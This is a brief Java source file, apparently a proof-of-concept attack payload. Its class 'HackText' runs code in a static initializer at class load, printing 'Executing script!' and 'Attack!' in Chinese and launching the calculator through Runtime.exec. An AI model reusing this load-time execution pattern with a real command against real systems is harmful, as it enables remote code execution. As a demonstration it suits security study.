package com.yy.hacker;

import java.io.IOException;

/**
 * @Author: 24只羊羊羊
 * @Date: 2021-12-12
 * @Description:
 */
public class HackText {
    static {
        System.out.println("执行脚本！");
        System.out.println("攻击！");
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
